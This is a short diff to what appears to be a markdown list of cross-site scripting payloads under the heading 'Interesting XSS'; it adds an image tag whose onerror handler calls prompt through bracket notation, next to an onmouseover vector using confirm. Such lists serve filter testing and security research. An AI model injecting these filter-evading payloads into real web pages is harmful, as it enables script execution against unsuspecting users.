@@ -98,7 +98,7 @@ Interesting XSS
 ==============
 ```html
 <xxxxxx onmouseover=confirm(/Mouse&nbsp;Test&nbsp;It/.source)>Example 123
-
+<img src=a onerror="self['prompt'](2)">
 ```
 Just a few things to remember
 ==============
